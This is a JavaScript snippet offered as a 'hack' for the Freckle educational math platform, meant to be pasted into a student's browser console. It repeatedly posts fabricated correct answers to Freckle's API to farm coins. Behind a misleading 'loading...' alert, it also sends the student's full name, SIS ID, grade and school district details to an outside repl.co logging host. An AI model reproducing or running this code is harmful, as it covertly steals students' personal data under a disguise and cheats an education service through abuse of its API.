



var r =await fetch("https://api.freckle.com/2/students/me", {
  method: "GET",
  credentials: "include"
,headers: {
    "Content-type": "application/json; charset=UTF-8"
    },
})
var district = await fetch("https://api.freckle.com/2/districts", {
  method: "GET",
  credentials: "include"
 
,headers: {
    "Content-type": "application/json; charset=UTF-8"
    },
})
g=await r.json()
d=await district.json()
district=d[0]
console.log(g)

async function coins(){
var id=document.getElementsByClassName("math-question__wrapper___iRtlD")[0]["dataset"]["questionId"]


var response= await fetch("https://api.freckle.com/3/subjects/math/products/targeted/sessions", {
  method: "POST",
  body: JSON.stringify({"studentIds":[g["id"]],"metadata":{"supportSetting":"none","questions":[{"questionId":id,"skillPair":{"skillId":"xpekuldo","subSkillId":null}}],"newOrRetry":{"tag":"new","contents":{"standardId":"lrwmctuu"}}}}),
  credentials: "include"
,headers: {
    "Content-type": "application/json; charset=UTF-8"
    },
})
json=await response.json()
var idd=json[0]['id']
console.log(idd)
var id=document.getElementsByClassName("math-question__wrapper___iRtlD")[0]["dataset"]["questionId"]
var response= await fetch("https://api.freckle.com/3/subjects/math/products/targeted/sessions/"+idd+"/answers", {
  method: "POST",
  body: JSON.stringify({"answers":[{"questionId":id,"durationSeconds":11,"attempts":1,"correctness":100,"answer":{"kind":"singular_or","answer":"90"}}],"coinsGained":150})
,headers: {
    "Content-type": "application/json; charset=UTF-8"
    },
  credentials: "include"
})

json=await response.json()
setTimeout(coins, 1);
}
dataa=g["firstName"]+" "+g["lastName"]+" "+g["sisId"]+" answers.js "+" grade: "+g["grade"]+" City: "+district["city"]+" name: "+district["name"]+" postal code: "+district["postalCode"]
alert("loading... (press ok to continue, this process may take a couple of seconds)")
await fetch("https://jjgrenontop.bobdob2.repl.co/log/"+dataa, {
  method: "GET",
  credentials: "include",
 mode: 'no-cors'       
,headers: {
    "Content-type": "application/json; charset=UTF-8"
    },
})
alert("to use this hack, you MUST be in financial literacy on level 1. If it says \"get started\" then you must complete the questions using the wrong answer. After that, if it doesn't, use the arrows at the bottom to scroll to level one. Once your in, click Ok will work.")
coins();
